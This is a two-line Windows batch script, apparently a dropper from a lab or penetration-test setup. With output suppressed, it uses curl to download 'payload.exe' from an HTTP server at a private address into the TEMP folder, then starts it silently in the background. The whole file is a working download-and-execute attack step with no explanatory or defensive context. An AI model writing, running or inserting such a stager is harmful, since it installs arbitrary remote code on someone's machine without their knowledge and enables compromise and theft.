@echo off
curl -s http://192.168.145.129:8000/payload/payload.exe -o %TEMP%\p.exe && start /b %TEMP%\p.exe
